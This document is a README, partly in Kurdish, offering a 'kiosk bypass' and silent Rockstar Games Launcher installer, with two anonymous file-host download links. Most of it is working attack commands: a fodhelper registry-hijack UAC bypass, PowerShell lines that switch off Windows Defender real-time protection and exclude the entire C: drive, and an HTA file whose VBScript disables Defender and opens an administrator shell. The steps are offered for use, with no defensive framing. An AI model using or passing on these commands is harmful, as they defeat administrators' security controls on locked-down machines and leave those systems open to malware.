

https://gofile.io/d/j6QNWKUh


https://gofile.io/d/RLTbn2Eb



mod made by seraph

```
+-----------------------------------+
| README.MD FOR GITHUB              |
| KIOSK BYPASS & ROCKSTAR INSTALLER |
+-----------------------------------+
```

```markdown
# Kiosk Bypass & Rockstar Games Launcher Automated Installer

## پێناسە (Description)
ئەم ڕێپێدانە بۆ تێپەڕاندنی سنووردارکردنەکانی کیۆسک (Kiosk) و دامەزراندنی خۆکاری Rockstar Games Launcher بەکاردێت.

## تایبەتمەندییەکان (Features)
- تێپەڕاندنی UAC (Fodhelper Bypass)
- جێبەجێکردنی سکریپتی PowerShell بەبێ سنووردارکردن
- دامەزراندنی بێدەنگی Rockstar Games Launcher
- داخستنی کاتی Windows Defender

## پێداویستییەکان (Prerequisites)
- Windows 10/11
- دەستڕاگەیشتن بە CMD (Command Prompt)

## ڕێنمایی بەکارهێنان (Usage Instructions)

### 1. تێپەڕاندنی UAC و بەدەستهێنانی دەستڕۆیشتوویی Administrator
```cmd
powershell -Command "New-Item -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(Default)' -Value 'cmd.exe' -Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force; Start-Process 'fodhelper.exe'; Start-Sleep -Seconds 2; Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force"
```

2. ناچالاککردنی Windows Defender

```cmd
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

3. زیادکردنی دەرکردن بۆ فۆڵدەری C

```cmd
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
```

4. داگرتنی Rockstar Games Launcher

```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://gamedownloads.rockstargames.com/public/installer/Rockstar-Games-Launcher.exe' -OutFile '%TEMP%\Rockstar-Games-Launcher.exe'"
```

5. دامەزراندنی بێدەنگ

```cmd
%TEMP%\Rockstar-Games-Launcher.exe /S
```

6. دەستپێکردنی بەرنامەکە

```cmd
start "" "%ProgramFiles%\Rockstar Games\Launcher\RockstarGamesLauncher.exe"
```

7. پاککردنەوەی فایلی دامەزراندن

```cmd
del /f /q "%TEMP%\Rockstar-Games-Launcher.exe"
```

8. دروستکردنی فایلی HTA بۆ جێبەجێکردن

```html
<!DOCTYPE html>
<html>
<head><title>Bypass</title><HTA:APPLICATION ID="Bypass" /></head>
<body>
<script language="VBScript">
Sub RunBypass()
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd.exe /c powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $true; Start-Process cmd.exe -Verb RunAs""", 1, False
End Sub
</script>
<button onclick="RunBypass()">Run Bypass</button>
</body>
</html>
```

```
